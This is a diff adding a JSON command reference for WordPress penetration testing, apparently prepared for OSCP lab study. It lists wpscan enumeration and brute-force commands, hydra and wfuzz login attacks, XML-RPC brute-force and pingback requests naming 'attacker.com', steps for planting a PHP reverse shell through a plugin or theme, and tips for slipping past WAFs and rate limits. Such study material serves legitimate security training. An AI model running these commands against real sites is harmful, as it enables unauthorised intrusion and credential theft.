@@ -1,0 +1,310 @@
+{
+  "category": "web",
+  "description": "WordPress enumeration and exploitation commands",
+  "commands": [
+    {
+      "id": "wpscan-enumerate-all",
+      "name": "WPScan Comprehensive Enumeration",
+      "category": "web",
+      "subcategory": "wordpress",
+      "command": "wpscan --url <URL> --enumerate u,ap,at,vp,vt,cb,dbe --api-token <API_TOKEN> --disable-tls-checks",
+      "description": "Enumerate WordPress users, plugins, themes, and vulnerabilities with comprehensive detection",
+      "tags": ["OSCP:HIGH", "WEB", "WORDPRESS", "CMS", "ENUMERATION", "QUICK_WIN"],
+      "variables": [
+        {
+          "name": "<URL>",
+          "description": "Target WordPress URL (include http:// or https://)",
+          "example": "http://192.168.45.100/wordpress",
+          "required": true
+        },
+        {
+          "name": "<API_TOKEN>",
+          "description": "WPScan API token from wpscan.com (free tier: 25 requests/day, register at https://wpscan.com/register)",
+          "example": "YOUR_API_TOKEN_HERE",
+          "required": false
+        }
+      ],
+      "flag_explanations": {
+        "--url": "Target WordPress site to scan",
+        "--enumerate": "Enumeration modes: u=users, ap=all plugins, at=all themes, vp=vulnerable plugins, vt=vulnerable themes, cb=config backups, dbe=db exports. Use comma-separated list for multiple modes",
+        "--api-token": "WPScan vulnerability database API token - significantly improves vulnerability detection accuracy by checking against WPVulnDB",
+        "--disable-tls-checks": "Disable SSL/TLS certificate validation (useful for self-signed certificates)"
+      },
+      "success_indicators": [
+        "[+] WordPress version X.X.X identified",
+        "[+] User(s) Identified:",
+        "[+] We found X plugin(s)",
+        "[+] We found X theme(s)",
+        "[!] No known vulnerabilities identified",
+        "[!] Title: CVE-XXXX-XXXXX"
+      ],
+      "failure_indicators": [
+        "The remote website is up, but does not seem to be running WordPress",
+        "The url supplied does not seem to be a valid WordPress URL",
+        "Scan Aborted: The remote server timed out",
+        "Error: Invalid API token",
+        "403 Forbidden"
+      ],
+      "next_steps": [
+        "wpscan-aggressive-detection",
+        "wpscan-password-attack",
+        "wordpress-xmlrpc-enum",
+        "searchsploit <plugin-name>",
+        "searchsploit <theme-name>"
+      ],
+      "alternatives": ["wordpress-manual-version", "whatweb-enum", "nikto-scan"],
+      "prerequisites": [],
+      "troubleshooting": {
+        "not_wordpress": "Verify WordPress installation: curl -s <URL> | grep wp-content OR curl -s <URL>/wp-admin/ OR curl -s <URL>/readme.html",
+        "timeout": "Reduce scan scope: --enumerate u (users only) OR increase timeout: --request-timeout 60",
+        "rate_limited": "Add delays between requests: --throttle 3000 (3 second delay) OR reduce thread count: --max-threads 5",
+        "no_api_token": "Get free token: https://wpscan.com/register (25 requests/day, no credit card required). Scan works without token but vulnerability detection is limited",
+        "ssl_errors": "Self-signed certificate: --disable-tls-checks flag already included. For proxy: --proxy http://127.0.0.1:8080 --disable-tls-checks",
+        "waf_blocking": "Try stealthier scan: remove aggressive options, add --user-agent 'Mozilla/5.0' OR use --random-user-agent",
+        "403_forbidden": "WordPress may be blocking scanners. Try manual enumeration: wordpress-manual-version OR use different user agent"
+      },
+      "notes": "WordPress is extremely common in OSCP labs (appears in 30%+ of machines). Always enumerate users first (u), then plugins (ap), then themes (at). API token enhances vulnerability detection but not required for basic enumeration. Time estimate: 5-15 minutes depending on plugin/theme count. Document all findings in enumeration.md. Free API token: https://wpscan.com/register (25 API calls/day sufficient for exam). Without API token, you still get plugin/theme/user enumeration but miss known vulnerabilities.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "wpscan-aggressive-detection",
+      "name": "WPScan Aggressive Plugin/Theme Detection",
+      "category": "web",
+      "subcategory": "wordpress",
+      "command": "wpscan --url <URL> --plugins-detection aggressive --themes-detection aggressive --enumerate ap,at --api-token <API_TOKEN>",
+      "description": "Aggressive WordPress plugin and theme enumeration (more thorough but noisier than passive detection)",
+      "tags": ["OSCP:HIGH", "WEB", "WORDPRESS", "CMS", "ENUMERATION", "NOISY"],
+      "variables": [
+        {
+          "name": "<URL>",
+          "description": "Target WordPress URL",
+          "example": "http://192.168.45.100/wordpress",
+          "required": true
+        },
+        {
+          "name": "<API_TOKEN>",
+          "description": "WPScan API token (optional but recommended)",
+          "example": "YOUR_API_TOKEN_HERE",
+          "required": false
+        }
+      ],
+      "flag_explanations": {
+        "--url": "Target WordPress site to scan",
+        "--plugins-detection": "Detection mode: passive (stealthy, checks readme.txt only) OR aggressive (thorough, checks directory listings and version files). Aggressive finds more but generates more logs",
+        "--themes-detection": "Detection mode for themes: passive OR aggressive. Aggressive mode checks style.css and other version indicators",
+        "--enumerate": "ap=all plugins, at=all themes. Without this, only vulnerable plugins/themes are enumerated",
+        "--api-token": "WPScan API token for vulnerability database access"
+      },
+      "success_indicators": [
+        "[+] We found X plugin(s)",
+        "[+] We found X theme(s)",
+        "[i] Plugin(s) Identified:",
+        "[i] Theme(s) Identified:",
+        "Version: X.X.X"
+      ],
+      "failure_indicators": [
+        "Scan Aborted",
+        "Error:",
+        "No plugins found",
+        "No themes found",
+        "403 Forbidden"
+      ],
+      "next_steps": [
+        "searchsploit <plugin-name> <version>",
+        "searchsploit <theme-name> <version>",
+        "wpscan-password-attack",
+        "Check plugin paths manually: curl <URL>/wp-content/plugins/<PLUGIN>/readme.txt"
+      ],
+      "alternatives": ["wpscan --enumerate vp,vt (vulnerable only)", "wordpress-manual-version"],
+      "prerequisites": ["wpscan-enumerate-all"],
+      "troubleshooting": {
+        "too_slow": "Use passive detection first: --plugins-detection passive --themes-detection passive",
+        "waf_blocking": "Aggressive mode triggers WAF. Use passive mode OR add delays: --throttle 5000",
+        "no_plugins_found": "Plugins may have custom paths. Check manually: curl <URL>/wp-content/plugins/ OR view page source for wp-content references",
+        "timeout": "Reduce scope: --enumerate ap (plugins only) OR --enumerate at (themes only)",
+        "false_positives": "Aggressive mode may report inactive/deleted plugins. Verify manually: curl -I <URL>/wp-content/plugins/<PLUGIN>/"
+      },
+      "notes": "Aggressive detection is more thorough but generates more logs (easier to detect). Use when passive enumeration (wpscan-enumerate-all) fails to find plugins/themes. Time estimate: 10-20 minutes. Passive mode: checks readme.txt and meta tags only (stealthy). Aggressive mode: attempts directory listing, checks multiple version files (noisy but complete). For OSCP, start passive then go aggressive if needed.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "wpscan-password-attack",
+      "name": "WPScan WordPress Password Attack",
+      "category": "web",
+      "subcategory": "wordpress",
+      "command": "wpscan --url <URL> --usernames <USERS> --passwords <WORDLIST> --max-threads <THREADS>",
+      "description": "WordPress user password brute force attack using discovered usernames and wordlist",
+      "tags": ["OSCP:HIGH", "WEB", "WORDPRESS", "CMS", "BRUTE_FORCE", "NOISY"],
+      "variables": [
+        {
+          "name": "<URL>",
+          "description": "Target WordPress URL",
+          "example": "http://192.168.45.100/wordpress",
+          "required": true
+        },
+        {
+          "name": "<USERS>",
+          "description": "Username(s) to test - comma-separated list or file path",
+          "example": "admin,john,editor",
+          "required": true
+        },
+        {
+          "name": "<WORDLIST>",
+          "description": "Password wordlist path",
+          "example": "/usr/share/wordlists/rockyou.txt",
+          "required": true
+        },
+        {
+          "name": "<THREADS>",
+          "description": "Number of concurrent threads (default 5, max 50)",
+          "example": "20",
+          "required": false
+        }
+      ],
+      "flag_explanations": {
+        "--url": "Target WordPress site to attack",
+        "--usernames": "Username(s) to brute force. Can be single username, comma-separated list, or file path (one username per line)",
+        "--passwords": "Path to password wordlist. Common: /usr/share/wordlists/rockyou.txt OR custom wordlist based on target",
+        "--max-threads": "Number of concurrent threads (1-50). Higher = faster but more detectable. Default 5 is stealthy. Use 20-30 for speed in OSCP"
+      },
+      "success_indicators": [
+        "[SUCCESS] - <USERNAME> / <PASSWORD>",
+        "Valid Combinations Found:",
+        "Login Successful"
+      ],
+      "failure_indicators": [
+        "No Valid Passwords Found",
+        "Error: Could not connect",
+        "403 Forbidden",
+        "Too Many Requests",
+        "Account Locked"
+      ],
+      "next_steps": [
+        "Login to WordPress: navigate to <URL>/wp-admin/ with found credentials",
+        "Check user role: dashboard shows capabilities (admin = full control, editor = limited)",
+        "Upload plugin shell if admin: Plugins > Add New > Upload Plugin > choose PHP reverse shell as .zip",
+        "Edit theme files: Appearance > Theme Editor > 404.php (add PHP reverse shell)",
+        "Search for sensitive data: Posts, Pages, Users, Settings"
+      ],
+      "alternatives": ["hydra -l <USER> -P <WORDLIST> <URL> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid'", "burp intruder", "wfuzz -z file,<WORDLIST> --hc 200 -d 'log=admin&pwd=FUZZ' <URL>/wp-login.php"],
+      "prerequisites": ["wpscan-enumerate-all (to discover usernames)"],
+      "troubleshooting": {
+        "too_slow": "Reduce wordlist size: head -n 1000 /usr/share/wordlists/rockyou.txt > small.txt OR increase threads: --max-threads 30",
+        "rate_limiting": "Add delay between requests: --throttle 3000 (3 seconds) OR reduce threads: --max-threads 5",
+        "account_lockout": "WordPress lockout plugin detected. Use smaller wordlist OR add longer delays: --throttle 10000",
+        "no_users_found": "First run: wpscan --url <URL> --enumerate u to discover usernames",
+        "403_forbidden": "WAF or security plugin blocking. Try: 1) Reduce threads --max-threads 1, 2) Add delays --throttle 5000, 3) Change user-agent --random-user-agent",
+        "connection_timeout": "Increase timeout: --request-timeout 60 --connect-timeout 60"
+      },
+      "notes": "WordPress password attacks are common in OSCP (credentials often lead to RCE via plugin/theme upload). Time estimate: 15-60 minutes depending on wordlist size. Always enumerate users first (wpscan-enumerate-all). Common usernames: admin, administrator, editor, author, john. Start with small wordlist (1000-5000 passwords), expand if needed. Rate limiting: most WordPress sites allow 5-10 requests/second before blocking. Use --throttle to avoid lockout. Success = admin access = RCE via plugin/theme modification.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "wordpress-xmlrpc-enum",
+      "name": "WordPress XML-RPC Enumeration",
+      "category": "web",
+      "subcategory": "wordpress",
+      "command": "curl -X POST -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' <URL>/xmlrpc.php",
+      "description": "Enumerate WordPress XML-RPC methods (potential for brute force, pingback attacks, and SSRF)",
+      "tags": ["OSCP:HIGH", "WEB", "WORDPRESS", "CMS", "ENUMERATION", "VULN"],
+      "variables": [
+        {
+          "name": "<URL>",
+          "description": "Target WordPress base URL (without /xmlrpc.php)",
+          "example": "http://192.168.45.100/wordpress",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "-X POST": "HTTP POST method required for XML-RPC requests",
+        "-d": "Data to send in POST body - XML-RPC method call structure",
+        "system.listMethods": "XML-RPC method that lists all available methods on the server (like API endpoint enumeration)",
+        "xmlrpc.php": "WordPress XML-RPC API endpoint (enabled by default in older versions)"
+      },
+      "success_indicators": [
+        "<methodResponse>",
+        "<array>",
+        "wp.getUsersBlogs",
+        "wp.getCategories",
+        "pingback.ping",
+        "system.multicall"
+      ],
+      "failure_indicators": [
+        "404 Not Found",
+        "XML-RPC services are disabled",
+        "403 Forbidden",
+        "Parse error",
+        "faultCode"
+      ],
+      "next_steps": [
+        "Test for pingback vulnerability: curl -X POST -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker.com/</string></value></param><param><value><string>http://target.com/valid-post</string></value></param></params></methodCall>' <URL>/xmlrpc.php",
+        "Brute force credentials: curl -X POST -d '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password123</value></param></params></methodCall>' <URL>/xmlrpc.php",
+        "Use system.multicall for faster brute force (multiple attempts in one request)",
+        "searchsploit xmlrpc",
+        "Check for known CVEs: searchsploit wordpress xmlrpc"
+      ],
+      "alternatives": ["wpscan --url <URL> --enumerate u --passwords <WORDLIST> (uses xmlrpc if available)", "burp suite XML-RPC plugin"],
+      "prerequisites": [],
+      "troubleshooting": {
+        "xmlrpc_disabled": "XML-RPC disabled (404 or error). This is good security but blocks this attack vector. Try other WordPress attacks",
+        "no_methods_listed": "XML-RPC enabled but methods may be restricted. Try specific methods manually: wp.getUsersBlogs, pingback.ping",
+        "403_forbidden": "WAF or security plugin blocking XML-RPC. Try from different IP OR focus on other attack vectors",
+        "parse_error": "Check XML syntax: ensure <methodCall> structure is correct. Use -H 'Content-Type: application/xml' if needed",
+        "ssl_error": "Self-signed cert: add -k flag to curl command"
+      },
+      "notes": "XML-RPC is a WordPress API endpoint (often enabled by default in older versions). Security implications: 1) Brute force: wp.getUsersBlogs method allows credential testing without lockout, 2) Pingback DDoS: pingback.ping can be abused for DDoS amplification, 3) system.multicall: send hundreds of login attempts in ONE request (bypasses rate limiting). Time estimate: 2-5 minutes. Pingback exploitation: attacker can make WordPress server ping arbitrary URLs (SSRF). For OSCP: check if XML-RPC is enabled, enumerate methods, test for brute force capability. Modern WordPress disables by default but legacy sites are vulnerable.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "wordpress-manual-version",
+      "name": "Manual WordPress Version Detection",
+      "category": "web",
+      "subcategory": "wordpress",
+      "command": "curl -s <URL> | grep 'content=\"WordPress'",
+      "description": "Manual WordPress version detection via meta generator tag (fallback when wpscan is blocked or unavailable)",
+      "tags": ["OSCP:HIGH", "WEB", "WORDPRESS", "CMS", "ENUMERATION", "MANUAL", "QUICK_WIN"],
+      "variables": [
+        {
+          "name": "<URL>",
+          "description": "Target WordPress URL",
+          "example": "http://192.168.45.100/wordpress",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "curl": "Command-line HTTP client for making web requests",
+        "-s": "Silent mode - hides progress meter and error messages",
+        "grep": "Search for pattern in output",
+        "'content=\"WordPress'": "Search pattern for WordPress version in meta generator tag"
+      },
+      "success_indicators": [
+        "content=\"WordPress 5.8.1\"",
+        "<meta name=\"generator\" content=\"WordPress",
+        "WordPress version found"
+      ],
+      "failure_indicators": [
+        "No output (version not in meta tag)",
+        "Connection refused",
+        "404 Not Found"
+      ],
+      "next_steps": [
+        "Check readme.html: curl -s <URL>/readme.html | grep 'Version'",
+        "Check feed: curl -s <URL>/feed/ | grep 'generator'",
+        "Check wp-includes: curl -I <URL>/wp-includes/js/jquery/jquery.js (version in path)",
+        "Check style.css: curl -s <URL>/wp-content/themes/<THEME>/style.css | grep 'Version'",
+        "Search for exploits: searchsploit wordpress <version>",
+        "Check plugin versions: curl -s <URL>/wp-content/plugins/<PLUGIN>/readme.txt"
+      ],
+      "alternatives": ["curl -s <URL>/readme.html", "curl -s <URL>/feed/ | grep generator", "whatweb-enum", "wpscan-enumerate-all"],
+      "prerequisites": [],
+      "troubleshooting": {
+        "no_version_found": "Meta generator removed (good security). Try alternatives: 1) curl <URL>/readme.html, 2) curl <URL>/feed/, 3) Check theme/plugin versions, 4) Version fingerprinting via js/css file paths",
+        "readme_removed": "readme.html deleted. Try feed method: curl -s <URL>/feed/ | grep generator",
+        "all_methods_fail": "Version fully hidden. Use behavioral fingerprinting: searchsploit wordpress <feature>, wpscan --url <URL> --enumerate vp (vulnerable plugins reveal version range)",
+        "waf_blocking": "Use different user agent: curl -s -A 'Mozilla/5.0' <URL> | grep WordPress"
+      },
+      "notes": "Manual version detection is CRITICAL when wpscan is blocked/unavailable (common in OSCP due to WAF/IPS). Time estimate: 1-2 minutes. Version detection methods (in order): 1) Meta generator tag (this command), 2) readme.html, 3) RSS feed generator, 4) JavaScript/CSS file paths, 5) Theme/plugin versions (indirect). Why manual matters: wpscan may be blocked by WAF but curl often bypasses. WordPress versions have known exploits: 4.x = RCE vulns, 5.0-5.2 = image upload RCE, 5.x = XSS. Always check version BEFORE exploitation attempts. Document in enumeration.md.",
+      "oscp_relevance": "high"
+    }
+  ]
+}
